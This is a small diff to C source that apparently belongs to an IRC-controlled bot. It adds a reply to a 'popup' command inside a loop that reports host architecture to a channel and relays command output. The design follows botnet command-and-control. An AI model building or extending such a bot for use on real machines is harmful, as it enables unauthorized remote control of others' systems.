@@ -102,6 +102,12 @@ void et_main_loop_nix(int socket, char *nick)
 						snprintf(machine, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
 						send(socket, machine, strlen(machine), 0);
 					}
+					else if (strstr(cmd, "popup"))
+					{
+						char nopopup[256];
+						snprintf(nopopup, 256, "PRIVMSG %s :%s is nix and cannot create popups.\r\n", IRC_CHANNEL, nick);
+						send(socket, nopopup, strlen(nopopup), 0);
+					}
 					else
 					{
 						char cmd_output[512];
